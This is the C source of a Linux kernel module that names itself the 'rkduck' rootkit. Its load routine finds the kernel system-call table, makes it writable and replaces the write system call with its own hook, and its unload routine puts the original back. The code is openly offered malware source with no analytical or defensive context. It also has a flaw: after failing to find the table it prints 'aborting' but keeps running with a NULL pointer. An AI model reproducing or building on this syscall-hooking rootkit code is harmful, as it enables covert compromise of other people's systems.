#include "duck.h"

ptr_t* sys_call_table = NULL;

int duck_init(void) {
    printk("rkduck: loaded\n");

    if ((sys_call_table = (ptr_t *) find_syscall_table())) {
        printk("rkduck: sys_call_table found at %p\n", sys_call_table);
    } else {
        printk("rkduck: sys_call_table not found, aborting\n");
    }

    set_page_rw((ptr_t) sys_call_table);
    original_write = xchg(&sys_call_table[__NR_write], duck_write);
    set_page_ro((ptr_t) sys_call_table);

    return 0;
}

void duck_exit(void) {
    set_page_rw((ptr_t) sys_call_table);
    xchg(&sys_call_table[__NR_write], original_write);
    set_page_ro((ptr_t) sys_call_table);

    printk("rkduck: unloaded\n");
}